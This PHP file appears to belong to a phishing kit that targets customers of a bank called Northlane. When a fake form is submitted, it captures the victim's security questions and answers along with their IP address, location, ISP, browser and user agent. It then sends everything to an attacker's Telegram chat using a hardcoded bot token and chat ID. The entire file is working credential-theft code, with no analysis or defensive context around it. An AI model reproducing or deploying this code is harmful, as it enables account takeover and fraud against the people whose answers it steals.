<?php
if($_SERVER['REQUEST_METHOD'] == "POST"){

    $secret_token = "5199683255:AAE9hRn3umiPBXEeNvGkGrF6iAOr-yeKC50";
    $telegram_id = "2132002128";
    $pesan_teks = "
                 #---------------------[ NORTHLANE QUESTION ]-------------------------#
                 Question 1 : ".$_POST['que1']." 
                 Question 2 : ".$_POST['que2']." 
                 Question 3 : ".$_POST['que3']." 
                 --------------ANSWER--------------
                 Answer 1 : ".$_POST['Answer1']." 
                 Answer 2 : ".$_POST['Answer2']." 
                 Answer 3 : ".$_POST['Answer3']." 
	            #-------------------[ DEVICE INFORMATION ]--------------------#
                IP Address  : ".$ip."
                ISP		    : ".$ispuser."
                Region		: ".$regioncity."
                City		: ".$citykota."
                GMT         : ".$continent."
                Timezone	: ".$timezone."
                OS/Browser	: ".$os." / ".$br."
                Date		: ".$date."
                User Agent	: ".$user_agent."
                #----------------[ Semangatkibossku ]----------------#";
                


function sendMessage($telegram_id, $pesan_teks, $secret_token) {
    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($pesan_teks);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $pesan_teks, $secret_token);
    }
?>